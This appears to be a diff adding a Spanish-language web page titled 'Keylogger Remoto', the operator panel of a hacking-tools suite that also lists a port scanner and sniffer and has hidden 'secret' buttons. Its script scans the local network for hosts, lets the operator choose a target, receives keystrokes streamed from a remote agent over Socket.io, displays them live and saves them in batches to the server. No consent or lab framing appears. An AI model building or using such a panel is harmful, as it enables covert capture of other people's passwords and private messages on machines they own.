@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Keylogger Remoto</title>
+  <!-- Ruta corregida para cargar el CSS desde la subcarpeta static -->
+  <link rel="stylesheet" href="static/css/style.css">
+  <!-- Socket.io apuntando al servidor de Node -->
+  <script src="http://localhost:3001/socket.io/socket.io.js"></script>
+</head>
+
+<body>
+  <div class="bg"></div>
+
+  <div class="nav-top-left">
+    <label for="mode">Herramienta:</label>
+    <select id="mode" name="mode">
+      <option value="index.html">Generador de contraseñas</option>
+      <option value="scanner.html">Escáner de puertos</option>
+      <option value="sniffer.html">Sniffer local</option>
+      <option value="keylogger.html" selected>Keylogger remoto</option>
+    </select>
+  </div>
+
+  <button class="secret-btn-left" id="secret-btn-left" aria-label="Abrir keylogger agent"></button>
+
+  <div class="grid">
+    <div class="card">
+      <h1>Keylogger Remoto</h1>
+      <p class="info">Captura pulsaciones de teclas en un computador remoto. Selecciona un host para iniciar.</p>
+
+      <div id="controls">
+        <button id="scan-network-btn">Buscar host</button>
+
+        <div id="network-section" style="margin-top: 20px;">
+          <h3>Hosts detectados</h3>
+          <p id="network-status">Presiona el botón para buscar hosts en la LAN.</p>
+          <!-- Contenedor corregido para los botones de IP -->
+          <div id="host-list" style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px;"></div>
+
+          <div id="selected-target" style="margin-top: 20px; color: #03dac6;" hidden>
+            <strong>Host seleccionado:</strong> <span id="selected-host">ninguno</span>
+          </div>
+        </div>
+
+        <div style="margin-top: 20px; display: flex; gap: 10px;">
+            <button id="start-btn" disabled>Iniciar Keylogger</button>
+            <button id="stop-btn" disabled>Detener Keylogger</button>
+        </div>
+
+        <div id="status" style="margin-top: 15px; color: #ffeb3b; display: none;"></div>
+        <div id="folder-count" style="margin-top: 5px; font-size: 12px; color: #bb86fc;">Carpetas creadas: 0</div>
+      </div>
+
+      <div class="res-box" id="results" hidden>
+        <h3>Logs en tiempo real</h3>
+        <div id="log-list" style="max-height: 300px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <button class="secret-btn" id="secret-btn" aria-label="Abrir chat secreto"></button>
+
+  <script>
+    const socket = io('http://localhost:3001');
+    const startBtn = document.getElementById('start-btn');
+    const stopBtn = document.getElementById('stop-btn');
+    const logList = document.getElementById('log-list');
+    const resultsDiv = document.getElementById('results');
+    const modeSelect = document.getElementById('mode');
+    const statusDiv = document.getElementById('status');
+    const scanNetworkBtn = document.getElementById('scan-network-btn');
+    const networkStatus = document.getElementById('network-status');
+    const hostListDiv = document.getElementById('host-list');
+    const selectedTargetDiv = document.getElementById('selected-target');
+    const selectedHostSpan = document.getElementById('selected-host');
+    const folderCountDiv = document.getElementById('folder-count');
+
+    let selectedHost = null;
+    let sessionFolderCount = 0;
+    let accumulatedLogs = [];
+
+    // Navegación
+    modeSelect.addEventListener('change', () => {
+      window.location.href = modeSelect.value;
+    });
+
+    // Función para seleccionar una IP de la lista
+    function seleccionarHost(ip) {
+      selectedHost = ip;
+      selectedHostSpan.textContent = ip;
+      selectedTargetDiv.hidden = false;
+      startBtn.disabled = false;
+      // Pequeño feedback visual
+      const buttons = hostListDiv.querySelectorAll('button');
+      buttons.forEach(btn => {
+        btn.style.borderColor = btn.innerText.includes(ip) ? '#03dac6' : 'transparent';
+      });
+    }
+
+    // Buscar Hosts (Ruta /network del servidor Node)
+    scanNetworkBtn.addEventListener('click', () => {
+      networkStatus.textContent = 'Buscando dispositivos...';
+      hostListDiv.innerHTML = '';
+      scanNetworkBtn.disabled = true;
+
+      fetch('/network')
+        .then(res => res.json())
+        .then(data => {
+          networkStatus.textContent = 'Selecciona un host de la lista:';
+          scanNetworkBtn.disabled = false;
+          
+          if (Array.isArray(data) && data.length > 0) {
+            data.forEach(ip => {
+              const btn = document.createElement('button');
+              btn.innerText = `IP: ${ip}`;
+              btn.style.padding = '8px 12px';
+              btn.style.cursor = 'pointer';
+              btn.onclick = () => seleccionarHost(ip);
+              hostListDiv.appendChild(btn);
+            });
+          } else {
+            networkStatus.textContent = 'No se detectaron hosts.';
+          }
+        })
+        .catch(err => {
+          console.error(err);
+          networkStatus.textContent = 'Error al conectar con el servidor.';
+          scanNetworkBtn.disabled = false;
+        });
+    });
+
+    // Iniciar captura
+    startBtn.addEventListener('click', () => {
+      if (!selectedHost) return;
+      
+      accumulatedLogs = [];
+      resultsDiv.hidden = false;
+      logList.innerHTML = '<p style="color: gray;">Esperando datos del agente...</p>';
+      
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+      statusDiv.style.display = 'block';
+      statusDiv.textContent = `Escuchando a: ${selectedHost}`;
+    });
+
+    // Detener captura
+    stopBtn.addEventListener('click', () => {
+      if (accumulatedLogs.length > 0) saveBatch();
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      statusDiv.style.display = 'none';
+    });
+
+    // Recibir datos por Socket.io
+    socket.on('keylogger-log', (data) => {
+      // Solo mostramos si el keylogger está "activo" en el panel
+      if (!stopBtn.disabled) {
+        if (logList.querySelector('p')) logList.innerHTML = ''; // Limpiar mensaje de espera
+
+        accumulatedLogs.push(data);
+        
+        const entry = document.createElement('div');
+        entry.style.fontSize = '14px';
+        entry.style.marginBottom = '5px';
+        entry.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
+        entry.innerHTML = `<span style="color: #03dac6;">[${new Date().toLocaleTimeString()}]</span> <strong>${data.log}</strong>`;
+        logList.prepend(entry); // Lo más nuevo arriba
+
+        if (accumulatedLogs.length >= 20) {
+          saveBatch();
+        }
+      }
+    });
+
+    // Guardar en servidor
+    function saveBatch() {
+      fetch('/api/keylogger/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ logs: accumulatedLogs })
+      })
+      .then(res => res.json())
+      .then(data => {
+        sessionFolderCount++;
+        folderCountDiv.textContent = `Carpetas creadas: ${sessionFolderCount}`;
+        accumulatedLogs = [];
+      })
+      .catch(err => console.error("Error al guardar:", err));
+    }
+
+    // Botones secretos
+    document.getElementById('secret-btn').addEventListener('click', () => window.location.href = 'chat.html');
+    document.getElementById('secret-btn-left').addEventListener('click', () => window.location.href = 'keylogger-agent.html');
+
+  </script>
+</body>
+</html>
